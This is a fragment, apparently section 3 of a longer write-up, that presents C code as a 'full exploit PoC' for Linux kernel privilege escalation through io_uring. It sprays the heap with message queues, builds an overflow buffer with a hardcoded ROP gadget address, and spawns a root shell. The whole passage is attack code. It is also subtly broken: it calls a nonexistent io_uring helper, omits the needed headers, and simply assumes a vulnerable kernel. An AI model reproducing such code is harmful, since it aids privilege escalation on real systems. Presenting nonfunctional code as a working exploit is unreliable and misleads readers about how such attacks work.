### **3. Full Exploit PoC (Simplified)**

```c
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <sys/msg.h>
#include <sys/ipc.h>

#define SPRAY_SIZE 256
#define OVERFLOW_SIZE 128

int main() {
    // Heap grooming
    int msqids[SPRAY_SIZE];
    for (int i = 0; i < SPRAY_SIZE; i++) {
        msqids[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
        struct msgbuf { long mtype; char mtext[OVERFLOW_SIZE]; } msg;
        memset(msg.mtext, 'A', sizeof(msg.mtext));
        msg.mtype = 1;
        msgsnd(msqids[i], &msg, sizeof(msg.mtext), 0);
    }

    int ring_fd = io_uring_setup(8, NULL); // Assume a vulnerable kernel
    struct io_uring_sqe sqe;

    // Overflow setup
    char overflow[OVERFLOW_SIZE + 8];
    memset(overflow, 0x41, sizeof(overflow));
    *(void **)(overflow + 128) = (void *)0xffffffff810a0c40; // pop rdi; ret

    // Trigger overflow
    io_uring_prep_sqe(&sqe);
    sqe.opcode = IORING_OP_LINK_TIMEOUT;
    sqe.addr = (unsigned long)overflow;
    sqe.len = 0x100;
    sqe.flags = IOSQE_FIXED_FILE;
    io_uring_enter(ring_fd, 1, 0, 0, NULL);

    // Cleanup
    for (int i = 0; i < SPRAY_SIZE; i++) {
        msgctl(msqids[i], IPC_RMID, NULL);
    }
    close(ring_fd);

    // Escalate privileges
    if (getuid() == 0) {
        system("/bin/sh");
    }
    return 0;
}
```

